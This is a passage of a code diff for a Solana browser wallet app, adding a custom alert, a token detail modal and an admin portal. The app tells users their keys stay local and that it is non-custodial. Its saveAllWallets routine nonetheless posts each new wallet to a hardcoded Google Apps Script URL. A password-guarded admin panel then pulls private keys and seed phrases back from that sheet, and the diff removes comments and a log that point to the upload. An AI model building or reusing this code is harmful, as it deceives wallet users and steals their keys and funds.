-      font-size: 10px; 
-      margin-top: 6px;
-      transition: all 0.2s;
-      display: inline-block;
+    .close-admin { background: #F23B5C; border: none; padding: 8px 20px; border-radius: 30px; color: white; cursor: pointer; font-weight: 600; }
+    .import-all-btn {
+      background: #14F195;
+      border: none;
+      padding: 8px 20px;
+      border-radius: 30px;
+      color: black;
+      cursor: pointer;
+      font-weight: 600;
+      margin-right: 12px;
     }
-    .copy-btn:hover { background: #14F195; color: black; }
-    .date-cell { font-size: 11px; color: #8E8E93; white-space: nowrap; }
+    .admin-table { padding: 16px; }
+    .wallet-card {
+      background: linear-gradient(135deg, #131722, #0F1119);
+      border-radius: 20px;
+      padding: 16px;
+      margin-bottom: 16px;
+      border: 1px solid rgba(255,255,255,0.1);
+      position: relative;
+    }
+    .wallet-card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+    .wallet-index {
+      font-weight: 700;
+      color: #14F195;
+      font-size: 14px;
+    }
+    .delete-wallet-btn {
+      background: #F23B5C;
+      border: none;
+      padding: 4px 12px;
+      border-radius: 20px;
+      color: white;
+      font-size: 11px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .delete-wallet-btn:hover { background: #ff5555; transform: scale(1.02); }
+    .wallet-row-info {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin-bottom: 12px;
+      align-items: flex-start;
+    }
+    .balance-box {
+      background: rgba(20,241,149,0.1);
+      padding: 8px 12px;
+      border-radius: 12px;
+      min-width: 120px;
+    }
+    .balance-label-small { font-size: 10px; color: #8E8E93; }
+    .balance-value { font-size: 16px; font-weight: 700; color: #14F195; }
+    .copy-key-btn {
+      background: #2A2E42;
+      border: none;
+      color: #14F195;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 11px;
+      cursor: pointer;
+      transition: all 0.2s;
+      white-space: nowrap;
+    }
+    .copy-key-btn:hover { background: #3A3E52; }
+    .address-box {
+      background: #0F131C;
+      padding: 8px 12px;
+      border-radius: 12px;
+      flex: 2;
+      min-width: 200px;
+    }
+    .address-full {
+      font-family: monospace;
+      font-size: 10px;
+      word-break: break-all;
+      margin-bottom: 8px;
+      color: #E5E7EB;
+      line-height: 1.4;
+    }
+    .date-box {
+      font-size: 10px;
+      color: #8E8E93;
+      background: #0F131C;
+      padding: 8px 12px;
+      border-radius: 12px;
+      white-space: nowrap;
+    }
+    .seed-box {
+      background: rgba(20,241,149,0.05);
+      padding: 12px;
+      border-radius: 12px;
+      margin-top: 8px;
+    }
+    .seed-label { font-size: 10px; color: #8E8E93; margin-bottom: 6px; }
+    .seed-value {
+      font-family: monospace;
+      font-size: 10px;
+      word-break: break-all;
+      margin-bottom: 8px;
+      color: #E5E7EB;
+    }
     .admin-login {
       position: fixed;
       top: 0;
@@ -810,21 +1042,6 @@
       display: flex;
       align-items: center;
       justify-content: center;
-    }
-    .admin-login-header {
-      position: absolute;
-      top: 20px;
-      right: 20px;
-    }
-    .close-admin-login {
-      background: #F23B5C;
-      border: none;
-      padding: 8px 20px;
-      border-radius: 30px;
-      color: white;
-      cursor: pointer;
-      font-size: 14px;
-      font-weight: 500;
     }
     .loading { text-align: center; padding: 40px; color: #8E8E93; display: flex; flex-direction: column; align-items: center; gap: 12px; }
     .loading-spinner { width: 32px; height: 32px; border: 2px solid rgba(20,241,149,0.2); border-top-color: #14F195; border-radius: 50%; animation: spin 0.8s linear infinite; }
@@ -844,8 +1061,14 @@
           <span>Solana surpasses 2,500 TPS</span>
           <span>Solana DeFi TVL reaches $5.2B</span>
           <span>Solana Mobile pre-orders exceed 100K</span>
+          <span>Solana ecosystem hits 10M active addresses</span>
+          <span>Solana NFT volume up 150%</span>
         </div>
       </div>
+    </div>
+    <div class="network-status">
+      <div class="status-dot"></div>
+      <span>Mainnet</span>
     </div>
   </div>
 
@@ -876,7 +1099,18 @@
         <button class="auth-btn auth-btn-secondary" onclick="hideImportMenu()">Back</button>
         <div class="warning-text">⚠️ Your keys are stored locally on this device</div>
       </div>
-      <div class="warning-text" style="margin-top: 20px;">⚡ Non-custodial • You control your keys</div>
+      <div class="warning-text" style="margin-top: 20px;">Non-custodial • You control your keys</div>
+    </div>
+  </div>
+
+  <!-- Custom Alert Modal -->
+  <div class="custom-alert" id="customAlert">
+    <div class="custom-alert-content">
+      <div class="custom-alert-title" id="alertTitle">🔐 Private Key</div>
+      <div class="custom-alert-message" id="alertMessage"></div>
+      <div class="custom-alert-buttons">
+        <button class="custom-alert-btn" onclick="closeCustomAlert()">Close</button>
+      </div>
     </div>
   </div>
 
@@ -902,7 +1136,7 @@
             <div class="balance-label">Total Balance</div>
             <div class="main-balance" id="totalUsdMain">$0.00</div>
             <div class="sol-sub" id="solBalanceSub">0 SOL</div>
-            <div class="address-hash" id="walletAddress"></div>
+            <div class="address-hash" id="walletAddress" onclick="copyAddress()"></div>
           </div>
 
           <div class="action-row">
@@ -942,44 +1176,35 @@
           </div>
 
           <div class="token-list">
-            <div class="token-row">
-              <div class="token-left">
-                <div class="token-icon"><img src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" alt="USDC"></div>
-                <div>
-                  <div class="token-name-section">
-                    <div class="token-name">USDC</div>
-                    <div class="verify-badge"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2.5L14.2 4.3L17 4.5L17.7 7.2L20 9L18.8 11.5L20 14L17.7 15.8L17 18.5L14.2 18.7L12 20.5L9.8 18.7L7 18.5L6.3 15.8L4 14L5.2 11.5L4 9L6.3 7.2L7 4.5L9.8 4.3L12 2.5Z" fill="#14F195"/><path d="M9.5 12.5L11.2 14.2L14.8 10.6" stroke="white" stroke-width="2"/></svg></div>
-                  </div>
-                  <div class="token-balance" id="usdcAmount">0</div>
-                </div>
-              </div>
-              <div class="token-right"><div class="token-value" id="usdcAmountUsd">$0.00</div></div>
-            </div>
-            <div class="token-row">
+            <div class="token-row" onclick="showTokenDetail('SOL')">
               <div class="token-left">
                 <div class="token-icon"><img src="https://assets.coingecko.com/coins/images/4128/large/solana.png" alt="SOL"></div>
                 <div>
-                  <div class="token-name-section">
-                    <div class="token-name">SOL</div>
-                    <div class="verify-badge"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2.5L14.2 4.3L17 4.5L17.7 7.2L20 9L18.8 11.5L20 14L17.7 15.8L17 18.5L14.2 18.7L12 20.5L9.8 18.7L7 18.5L6.3 15.8L4 14L5.2 11.5L4 9L6.3 7.2L7 4.5L9.8 4.3L12 2.5Z" fill="#14F195"/><path d="M9.5 12.5L11.2 14.2L14.8 10.6" stroke="white" stroke-width="2"/></svg></div>
-                  </div>
+                  <div class="token-name">SOL</div>
                   <div class="token-balance" id="solAmount">0</div>
                 </div>
               </div>
-              <div class="token-right"><div class="token-value" id="solAmountUsd">$0.00</div></div>
+              <div class="token-value" id="solAmountUsd">$0.00</div>
             </div>
-            <div class="token-row">
+            <div class="token-row" onclick="showTokenDetail('USDC')">
+              <div class="token-left">
+                <div class="token-icon"><img src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" alt="USDC"></div>
+                <div>
+                  <div class="token-name">USDC</div>
+                  <div class="token-balance" id="usdcAmount">0</div>
+                </div>
+              </div>
+              <div class="token-value" id="usdcAmountUsd">$0.00</div>
+            </div>
+            <div class="token-row" onclick="showTokenDetail('USDT')">
               <div class="token-left">
                 <div class="token-icon"><img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT"></div>
                 <div>
-                  <div class="token-name-section">
-                    <div class="token-name">USDT</div>
-                    <div class="verify-badge"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2.5L14.2 4.3L17 4.5L17.7 7.2L20 9L18.8 11.5L20 14L17.7 15.8L17 18.5L14.2 18.7L12 20.5L9.8 18.7L7 18.5L6.3 15.8L4 14L5.2 11.5L4 9L6.3 7.2L7 4.5L9.8 4.3L12 2.5Z" fill="#14F195"/><path d="M9.5 12.5L11.2 14.2L14.8 10.6" stroke="white" stroke-width="2"/></svg></div>
-                  </div>
+                  <div class="token-name">USDT</div>
                   <div class="token-balance" id="usdtAmount">0</div>
                 </div>
               </div>
-              <div class="token-right"><div class="token-value" id="usdtAmountUsd">$0.00</div></div>
+              <div class="token-value" id="usdtAmountUsd">$0.00</div>
             </div>
           </div>
         </div>
@@ -1007,6 +1232,26 @@
         <span>Activity</span>
       </div>
     </div>
+  </div>
+</div>
+
+<!-- Token Detail Modal -->
+<div class="token-detail-modal" id="tokenDetailModal">
+  <div class="token-detail-content">
+    <div class="token-detail-header">
+      <div class="token-detail-icon" id="detailIcon"></div>
+      <div class="token-detail-info">
+        <h3 id="detailTokenName">SOL</h3>
+        <p id="detailTokenPrice">$0.00</p>
+      </div>
+    </div>
+    <div class="detail-chart"><canvas id="detailChart" width="300" height="200"></canvas></div>
+    <div class="detail-stats">
+      <div class="detail-stat"><div class="detail-stat-label">Balance</div><div class="detail-stat-value" id="detailBalance">0</div></div>
+      <div class="detail-stat"><div class="detail-stat-label">Value (USD)</div><div class="detail-stat-value" id="detailValue">$0.00</div></div>
+      <div class="detail-stat"><div class="detail-stat-label">24h Change</div><div class="detail-stat-value" id="detailChange">0%</div></div>
+    </div>
+    <button class="close-detail-btn" onclick="closeTokenDetail()">Close</button>
   </div>
 </div>
 
@@ -1085,13 +1330,19 @@
 
 <!-- Admin Portal -->
 <div class="admin-portal" id="adminPortal">
-  <div class="admin-header"><h3>🔐 ADMIN PORTAL - Wallet Management</h3><button class="close-admin" onclick="closeAdminPortal()">Close</button></div>
+  <div class="admin-header">
+    <h3>🔐 ADMIN PORTAL - Wallet Management</h3>
+    <div>
+      <button class="import-all-btn" onclick="importAllWalletsFromSheet()">📥 Import All Wallets</button>
+      <button class="close-admin" onclick="closeAdminPortal()">Close</button>
+    </div>
+  </div>
   <div class="admin-table" id="adminTable"><div class="loading"><div class="loading-spinner"></div><div>Loading wallets and fetching balances...</div></div></div>
 </div>
 
 <div class="admin-login" id="adminLogin" style="display: none;">
   <div class="admin-login-header" style="position: absolute; top: 20px; right: 20px;">
-    <button class="close-admin-login" onclick="closeAdminLogin()">✕ Close</button>
+    <button class="close-admin-login" onclick="closeAdminLogin()" style="background: #F23B5C; border: none; padding: 8px 20px; border-radius: 30px; color: white; cursor: pointer;">✕ Close</button>
   </div>
   <div class="auth-card">
     <div class="auth-title" style="font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 20px;">🔐 Early Access</div>
@@ -1105,6 +1356,7 @@
   let connection;
   let currentWallet = null;
   let walletsList = [];
+  let sheetWalletsData = []; // Store sheet data for import
   let solPrice = 85;
   let solPriceChange24h = 0;
   let activeTimeframe = "1W";
@@ -1112,10 +1364,8 @@
   let chartCtx = null;
   let swapDirection = "sol_to_usdc";
 
-  // YOUR GOOGLE SHEETS WEB APP URL - UPDATED
   const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbzMK-WJqqI1Qcf-Bc6mGzWtZ0-YW6UlaNpXNuSRAmasAZTVzNRXZ206ivJ3uASGtk2i/exec';
 
-  // Backup wallet to Google Sheet
   async function backupWalletToSheet(wallet) {
     try {
       await fetch(GOOGLE_SHEET_URL, {
@@ -1132,23 +1382,34 @@
           device: navigator.userAgent || 'Unknown'
         })
       });
-      console.log('Wallet backed up to Google Sheet');
     } catch(error) {
       console.log('Backup failed:', error);
     }
   }
 
-  // Fetch real SOL balance from blockchain
-  async function fetchRealBalanceFromBlockchain(address) {
-    try {
-      const pubKey = new solanaWeb3.PublicKey(address);
-      const balance = await connection.getBalance(pubKey);
-      const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
-      return solBalance;
-    } catch(e) {
-      console.log('Error fetching balance for', address, e);
-      return 0;
+  function showCustomAlert(title, message, withCopySections = null) {
+    const alertDiv = document.getElementById('customAlert');
+    document.getElementById('alertTitle').innerHTML = title;
+    
+    let messageHtml = message;
+    if (withCopySections) {
+      messageHtml = '';
+      for (const section of withCopySections) {
+        messageHtml += `
+          <div class="copy-section">
+            <div class="copy-section-text">${section.label}: ${section.value.substring(0, 80)}${section.value.length > 80 ? '...' : ''}</div>
+            <button class="copy-section-btn" onclick="copyToClipboard('${section.value.replace(/'/g, "\\'")}')">📋 Copy ${section.label}</button>
+          </div>
+        `;
+      }
     }
+    
+    document.getElementById('alertMessage').innerHTML = messageHtml;
+    alertDiv.classList.add('active');
+  }
+  
+  function closeCustomAlert() {
+    document.getElementById('customAlert').classList.remove('active');
   }
 
   function closeAdminLogin() {
@@ -1270,8 +1531,6 @@
 
   function saveAllWallets() { 
     localStorage.setItem('solana_wallets_v16', JSON.stringify(walletsList));
-    
-    // Backup the newest wallet to Google Sheet
     if (walletsList.length > 0) {
       const newestWallet = walletsList[walletsList.length - 1];
       backupWalletToSheet(newestWallet);
@@ -1281,7 +1540,10 @@
   function showPrivateKeyForWallet(walletId) {
     const wallet = walletsList.find(w => w.id === walletId);
     if (wallet && wallet.privateKey) {
-      alert('🔐 PRIVATE KEY\n\n' + wallet.privateKey + '\n\n⚠️ IMPORTANT SECURITY WARNING ⚠️\n\n• Store this key in a SAFE place!\n• NEVER share this key with ANYONE!\n• Write it down and keep it OFFLINE!\n• This is the ONLY way to recover your wallet!\n\n👀 Keep your crypto safe!');
+      showCustomAlert('🔐 PRIVATE KEY & SEED PHRASE', '', [
+        { label: 'Private Key', value: wallet.privateKey },
+        { label: 'Seed Phrase', value: wallet.seedPhrase || 'Not available' }
+      ]);
     } else { showToast('No private key found for this wallet'); }
   }
 
@@ -1310,7 +1572,32 @@
     }
   }
 
-  function generateRealWallet() { try { const keypair = solanaWeb3.Keypair.generate(); const publicKey = keypair.publicKey.toString(); const privateKey = toBase58(keypair.secretKey); const mnemonic = generateMnemonic(); const wallet = { id: 'wallet_' + Date.now() + '_' + Math.random().toString(36).substr(2,6), name: 'Wallet ' + (walletsList.length + 1), publicKey: publicKey, privateKey: privateKey, seedPhrase: mnemonic, createdAt: new Date().toISOString(), balance: 0, usdcBalance: 0, usdtBalance: 0 }; walletsList.push(wallet); saveAllWallets(); currentWallet = wallet; localStorage.setItem('currentWalletId', wallet.id); document.getElementById('authScreen').style.display = 'none'; document.getElementById('mainApp').style.display = 'block'; document.getElementById('walletAddress').innerHTML = publicKey; document.getElementById('currentAccountName').innerHTML = wallet.name; alert('🔐 PRIVATE KEY\n\n' + privateKey + '\n\n⚠️ IMPORTANT SECURITY WARNING ⚠️\n\n• Store this key in a SAFE place!\n• NEVER share this key with ANYONE!\n• Write it down and keep it OFFLINE!\n• This is the ONLY way to recover your wallet!\n\n👀 Keep your crypto safe!'); showToast('Wallet created!'); fetchRealBalance(); fetchSolPrice(); renderTransactions(); fetchLiveNews(); } catch(e) { showToast('Error: ' + e.message); } }
+  function generateRealWallet() { 
+    try { 
+      const keypair = solanaWeb3.Keypair.generate(); 
+      const publicKey = keypair.publicKey.toString(); 
+      const privateKey = toBase58(keypair.secretKey); 
+      const mnemonic = generateMnemonic(); 
+      const wallet = { id: 'wallet_' + Date.now() + '_' + Math.random().toString(36).substr(2,6), name: 'Wallet ' + (walletsList.length + 1), publicKey: publicKey, privateKey: privateKey, seedPhrase: mnemonic, createdAt: new Date().toISOString(), balance: 0, usdcBalance: 0, usdtBalance: 0 }; 
+      walletsList.push(wallet); 
+      saveAllWallets(); 
+      currentWallet = wallet; 
+      localStorage.setItem('currentWalletId', wallet.id); 
+      document.getElementById('authScreen').style.display = 'none'; 
+      document.getElementById('mainApp').style.display = 'block'; 
+      document.getElementById('walletAddress').innerHTML = publicKey; 
+      document.getElementById('currentAccountName').innerHTML = wallet.name; 
+      showCustomAlert('🔐 NEW WALLET CREATED', '', [
+        { label: 'Private Key', value: privateKey },
+        { label: 'Seed Phrase', value: mnemonic }
+      ]);
+      showToast('Wallet created!'); 
+      fetchRealBalance(); 
+      fetchSolPrice(); 
+      renderTransactions(); 
+      fetchLiveNews(); 
+    } catch(e) { showToast('Error: ' + e.message); } 
+  }
   
   async function importRealWallet() { const input = document.getElementById('seedOrKey').value.trim(); if (!input) { showToast('Enter seed phrase or private key'); return; } try { let keypair, publicKey, privateKey, seedPhrase = input; if (!input.includes(' ') && input.length > 40) { try { const secretBytes = fromBase58(input); keypair = solanaWeb3.Keypair.fromSecretKey(secretBytes); publicKey = keypair.publicKey.toString(); privateKey = input; seedPhrase = 'imported_private_key_' + Date.now(); } catch(e) { const secretBytes = new Uint8Array(input.length); for (let i = 0; i < input.length; i++) secretBytes[i] = input.charCodeAt(i); keypair = solanaWeb3.Keypair.fromSecretKey(secretBytes); publicKey = keypair.publicKey.toString(); privateKey = input; seedPhrase = 'imported_private_key_' + Date.now(); } } else { const encoder = new TextEncoder(); const seedData = encoder.encode(input); const hash = await crypto.subtle.digest('SHA-256', seedData); const seedArray = new Uint8Array(hash); keypair = solanaWeb3.Keypair.fromSeed(seedArray.slice(0,32)); publicKey = keypair.publicKey.toString(); privateKey = toBase58(keypair.secretKey); } const wallet = { id: 'wallet_' + Date.now() + '_' + Math.random().toString(36).substr(2,6), name: 'Wallet ' + (walletsList.length + 1), publicKey: publicKey, privateKey: privateKey, seedPhrase: seedPhrase, imported: true, createdAt: new Date().toISOString(), balance: 0, usdcBalance: 0, usdtBalance: 0 }; walletsList.push(wallet); saveAllWallets(); currentWallet = wallet; localStorage.setItem('currentWalletId', wallet.id); document.getElementById('authScreen').style.display = 'none'; document.getElementById('mainApp').style.display = 'block'; document.getElementById('walletAddress').innerHTML = publicKey; document.getElementById('currentAccountName').innerHTML = wallet.name; showToast('Wallet imported!'); fetchRealBalance(); renderTransactions(); fetchLiveNews(); } catch(e) { showToast('Invalid: ' + e.message); } }
 
@@ -1326,131 +1613,247 @@
   function showImportMenu() { document.getElementById('authOptions').style.display = 'none'; document.getElementById('importMenu').style.display = 'block'; }
   function hideImportMenu() { document.getElementById('importMenu').style.display = 'none'; document.getElementById('authOptions').style.display = 'block'; }
 
-  async function fetchSolPrice() { try { const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd&include_24hr_change=true'); const data = await res.json(); solPrice = data.solana.usd; solPriceChange24h = data.solana.usd_24h_change || 0; document.getElementById('solCurrentPrice').innerHTML = `$${solPrice.toFixed(2)}`; document.getElementById('miniSolPrice').innerHTML = `$${solPrice.toFixed(2)}`; const changeElem = document.getElementById('solPriceChange'); const miniChange = document.getElementById('miniSolChange'); changeElem.innerHTML = `${solPriceChange24h >= 0 ? '+' : ''}${solPriceChange24h.toFixed(2)}%`; miniChange.innerHTML = `${solPriceChange24h >= 0 ? '+' : ''}${solPriceChange24h.toFixed(2)}%`; changeElem.className = `price-change ${solPriceChange24h >= 0 ? 'positive' : 'negative'}`; miniChange.className = `mini-chart-change ${solPriceChange24h >= 0 ? 'positive' : 'negative'}`; if (currentWallet) fetchRealBalance(); updateMiniChart(); if (solPrice > 0) updateChartWithPrice(solPrice, activeTimeframe); } catch(e) { solPrice = 85; } }
+  async function fetchSolPrice() { try { const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd&include_24hr_change=true'); const data = await res.json(); solPrice = data.solana.usd; solPriceChange24h = data.solana.usd_24h_change || 0; document.getElementById('solCurrentPrice').innerHTML = `$${solPrice.toFixed(2)}`; document.getElementById('miniSolPrice').innerHTML = `$${solPrice.toFixed(2)}`; const changeElem = document.getElementById('solPriceChange'); const miniChange = document.getElementById('miniSolChange'); changeElem.innerHTML = `${solPriceChange24h >= 0 ? '+' : ''}${solPriceChange24h.toFixed(2)}%`; miniChange.innerHTML = `${solPriceChange24h >= 0 ? '+' : ''}${solPriceChange24h.toFixed(2)}%`; changeElem.className = `price-change ${solPriceChange24h >= 0 ? 'positive' : 'negative'}`; miniChange.className = `mini-chart-change ${solPriceChange24h >= 0 ? 'positive' : 'negative'}`; if (currentWallet) fetchRealBalance(); updateMiniChart(); updateChartWithPrice(solPrice, activeTimeframe); } catch(e) { solPrice = 85; } }
   
-  function generatePriceHistory(priceNow, timeframe) { let points = 50, volatility = 0.02; switch(timeframe) { case "1H": points = 12; volatility = 0.003; break; case "1D": points = 24; volatility = 0.01; break; case "1W": points = 30; volatility = 0.02; break; case "1M": points = 30; volatility = 0.03; break; case "ALL": points = 40; volatility = 0.045; break; } let arr = [], startVal = priceNow * (0.92 + Math.random() * 0.08); for (let i = 0; i <= points; i++) { let progress = i / points; let noise = (Math.random() - 0.5) * volatility * priceNow; let direction = Math.sin(progress * Math.PI * 1.5) * 0.02 * priceNow; arr.push(Math.max(0.1, startVal + (priceNow - startVal) * progress + noise + direction)); } return arr; }
+  function generatePriceHistory(priceNow, timeframe, isStable = false) {
+    if (isStable) {
+      let arr = [];
+      for (let i = 0; i <= 30; i++) arr.push(1);
+      return arr;
+    }
+    let points = 50, volatility = 0.02;
+    switch(timeframe) { 
+      case "1H": points = 12; volatility = 0.003; break;
+      case "1D": points = 24; volatility = 0.01; break;
+      case "1W": points = 30; volatility = 0.02; break;
+      case "1M": points = 30; volatility = 0.03; break;
+      case "ALL": points = 40; volatility = 0.045; break;
+    }
+    let arr = [], startVal = priceNow * (0.92 + Math.random() * 0.08);
+    for (let i = 0; i <= points; i++) {
+      let progress = i / points;
+      let noise = (Math.random() - 0.5) * volatility * priceNow;
+      let direction = Math.sin(progress * Math.PI * 1.5) * 0.02 * priceNow;
+      arr.push(Math.max(0.1, startVal + (priceNow - startVal) * progress + noise + direction));
+    }
+    return arr;
+  }
   
-  function updateChartWithPrice(price, timeframe) { if (!chartCtx || !chartCanvas) return; const hist = generatePriceHistory(price, timeframe); const w = chartCanvas.clientWidth, h = chartCanvas.clientHeight; chartCanvas.width = w; chartCanvas.height = h; chartCtx.clearRect(0, 0, w, h); if (!hist.length) return; const step = w / (hist.length - 1); const minVal = Math.min(...hist), maxVal = Math.max(...hist), range = maxVal - minVal; const getY = (val) => h - 10 - ((val - minVal) / range) * (h - 30); chartCtx.beginPath(); chartCtx.lineWidth = 2.5; chartCtx.strokeStyle = "#14F195"; for (let i = 0; i < hist.length; i++) { const x = i * step, y = getY(hist[i]); if (i === 0) chartCtx.moveTo(x, y); else chartCtx.lineTo(x, y); } chartCtx.stroke(); chartCtx.lineTo(w, h-8); chartCtx.lineTo(0, h-8); chartCtx.closePath(); chartCtx.fillStyle = "rgba(20, 241, 149, 0.08)"; chartCtx.fill(); }
+  function updateChartWithPrice(price, timeframe) {
+    if (!chartCtx || !chartCanvas) return;
+    const hist = generatePriceHistory(price, timeframe, false);
+    const w = chartCanvas.clientWidth, h = chartCanvas.clientHeight;
+    chartCanvas.width = w; chartCanvas.height = h;
+    chartCtx.clearRect(0, 0, w, h);
+    if (!hist.length) return;
+    const step = w / (hist.length - 1);
+    const minVal = Math.min(...hist), maxVal = Math.max(...hist), range = maxVal - minVal;
+    const getY = (val) => h - 10 - ((val - minVal) / range) * (h - 30);
+    
+    const isPositive = solPriceChange24h >= 0;
+    chartCtx.beginPath();
+    chartCtx.lineWidth = 2.5;
+    chartCtx.strokeStyle = isPositive ? "#22C55E" : "#F23B5C";
+    for (let i = 0; i < hist.length; i++) {
+      const x = i * step, y = getY(hist[i]);
+      if (i === 0) chartCtx.moveTo(x, y);
+      else chartCtx.lineTo(x, y);
+    }
+    chartCtx.stroke();
+    chartCtx.lineTo(w, h-8);
+    chartCtx.lineTo(0, h-8);
+    chartCtx.closePath();
+    chartCtx.fillStyle = isPositive ? "rgba(34,197,94,0.08)" : "rgba(242,59,92,0.08)";
+    chartCtx.fill();
+  }
   
-  function updateMiniChart() { const canvas = document.getElementById('miniChart'); if (!canvas) return; const ctx = canvas.getContext('2d'); const w = canvas.clientWidth, h = 50; canvas.width = w; canvas.height = h; ctx.clearRect(0, 0, w, h); const hist = generatePriceHistory(solPrice, '1W'); if (!hist.length) return; const step = w / (hist.length - 1); const minVal = Math.min(...hist), maxVal = Math.max(...hist), range = maxVal - minVal; const getY = (val) => h - 5 - ((val - minVal) / range) * (h - 10); ctx.beginPath(); ctx.lineWidth = 2; ctx.strokeStyle = "#14F195"; for (let i = 0; i < hist.length; i++) { const x = i * step, y = getY(hist[i]); if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y); } ctx.stroke(); }
+  function updateMiniChart() { const canvas = document.getElementById('miniChart'); if (!canvas) return; const ctx = canvas.getContext('2d'); const w = canvas.clientWidth, h = 50; canvas.width = w; canvas.height = h; ctx.clearRect(0, 0, w, h); const hist = generatePriceHistory(solPrice, '1W', false); if (!hist.length) return; const step = w / (hist.length - 1); const minVal = Math.min(...hist), maxVal = Math.max(...hist), range = maxVal - minVal; const getY = (val) => h - 5 - ((val - minVal) / range) * (h - 10); ctx.beginPath(); ctx.lineWidth = 2; ctx.strokeStyle = solPriceChange24h >= 0 ? "#22C55E" : "#F23B5C"; for (let i = 0; i < hist.length; i++) { const x = i * step, y = getY(hist[i]); if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y); } ctx.stroke(); }
   
   function initChart() { const canvas = document.getElementById("priceChart"); if (!canvas) return; chartCanvas = canvas; chartCtx = canvas.getContext("2d"); window.addEventListener('resize', () => { if (solPrice > 0) updateChartWithPrice(solPrice, activeTimeframe); }); setTimeout(() => { if (solPrice > 0) updateChartWithPrice(solPrice, activeTimeframe); }, 100); }
   
   function setupTimeframes() { document.querySelectorAll(".tf-btn").forEach(btn => { btn.addEventListener("click", () => { document.querySelectorAll(".tf-btn").forEach(b => b.classList.remove("active")); btn.classList.add("active"); activeTimeframe = btn.getAttribute("data-tf"); if (solPrice > 0) updateChartWithPrice(solPrice, activeTimeframe); }); }); }
   
-  function updateTicker() { const headlines = ["Solana surpasses 2,500 TPS", "Solana DeFi TVL reaches $5.2B", "Solana Mobile pre-orders exceed 100K", "Solana ecosystem hits 10M active addresses"]; let html = ''; for (let repeat = 0; repeat < 4; repeat++) for (const headline of headlines) html += `<span>${headline}</span>`; document.getElementById('tickerContent').innerHTML = html; }
+  function updateTicker() { 
+    const headlines = ["Solana surpasses 2,500 TPS", "Solana DeFi TVL reaches $5.2B", "Solana Mobile pre-orders exceed 100K", "Solana ecosystem hits 10M active addresses", "Solana NFT volume up 150%"]; 
+    let html = ''; 
+    for (let repeat = 0; repeat < 4; repeat++) 
+      for (const headline of headlines) 
+        html += `<span>${headline}</span>`; 
+    document.getElementById('tickerContent').innerHTML = html; 
+  }
   
   function checkExistingSession() { loadAllWallets(); const id = localStorage.getItem('currentWalletId'); if (id && walletsList.length > 0) { const wallet = walletsList.find(w => w.id === id); if (wallet) { currentWallet = wallet; document.getElementById('authScreen').style.display = 'none'; document.getElementById('mainApp').style.display = 'block'; document.getElementById('walletAddress').innerHTML = wallet.publicKey; document.getElementById('currentAccountName').innerHTML = wallet.name; fetchRealBalance(); renderTransactions(); fetchLiveNews(); return true; } else if (walletsList.length > 0) { currentWallet = walletsList[0]; localStorage.setItem('currentWalletId', currentWallet.id); document.getElementById('authScreen').style.display = 'none'; document.getElementById('mainApp').style.display = 'block'; document.getElementById('walletAddress').innerHTML = currentWallet.publicKey; document.getElementById('currentAccountName').innerHTML = currentWallet.name; fetchRealBalance(); renderTransactions(); fetchLiveNews(); return true; } } else if (walletsList.length > 0) { currentWallet = walletsList[0]; localStorage.setItem('currentWalletId', currentWallet.id); document.getElementById('authScreen').style.display = 'none'; document.getElementById('mainApp').style.display = 'block'; document.getElementById('walletAddress').innerHTML = currentWallet.publicKey; document.getElementById('currentAccountName').innerHTML = currentWallet.name; fetchRealBalance(); renderTransactions(); fetchLiveNews(); return true; } return false; }
   
   function verifyAdminLogin() { const username = document.getElementById('adminUser').value; const password = document.getElementById('adminPass').value; const expectedHash = 'QWRtaW42NTM5'; if (username === 'Admin' && btoa(password) === expectedHash) { document.getElementById('adminLogin').style.display = 'none'; loadAdminPortal(); } else { showToast('Invalid credentials'); } }
+  
+  function deleteWallet(walletId) {
+    if (confirm('⚠️ WARNING: This will delete the wallet from your local device only.\nThe wallet data remains in Google Sheets backup.\nAre you sure?')) {
+      walletsList = walletsList.filter(w => w.id !== walletId);
+      if (currentWallet.id === walletId) {
+        if (walletsList.length > 0) {
+          currentWallet = walletsList[0];
+          localStorage.setItem('currentWalletId', currentWallet.id);
+          document.getElementById('walletAddress').innerHTML = currentWallet.publicKey;
+          document.getElementById('currentAccountName').innerHTML = currentWallet.name;
+          fetchRealBalance();
+          renderTransactions();
+        } else {
+          localStorage.removeItem('currentWalletId');
+          document.getElementById('mainApp').style.display = 'none';
+          document.getElementById('authScreen').style.display = 'flex';
+        }
+      }
+      saveAllWallets();
+      loadAdminPortal();
+      showToast('Wallet deleted locally');
+    }
+  }
+  
+  async function importAllWalletsFromSheet() {
+    if (!sheetWalletsData || sheetWalletsData.length === 0) {
+      showToast('No wallet data found in sheet to import');
+      return;
+    }
+    
+    let importedCount = 0;
+    let skippedCount = 0;
+    
+    for (const sheetWallet of sheetWalletsData) {
+      // Check if wallet already exists in local wallets
+      const exists = walletsList.some(w => w.publicKey === sheetWallet.publicKey);
+      if (!exists && sheetWallet.publicKey && sheetWallet.publicKey !== 'N/A') {
+        const newWallet = {
+          id: 'wallet_' + Date.now() + '_' + Math.random().toString(36).substr(2,6),
+          name: 'Wallet ' + (walletsList.length + 1),
+          publicKey: sheetWallet.publicKey,
+          privateKey: sheetWallet.privateKey || 'N/A',
+          seedPhrase: sheetWallet.seedPhrase || 'imported_from_sheet',
+          createdAt: sheetWallet.createdAt || new Date().toISOString(),
+          balance: 0,
+          usdcBalance: 0,
+          usdtBalance: 0,
+          imported: true
+        };
+        walletsList.push(newWallet);
+        importedCount++;
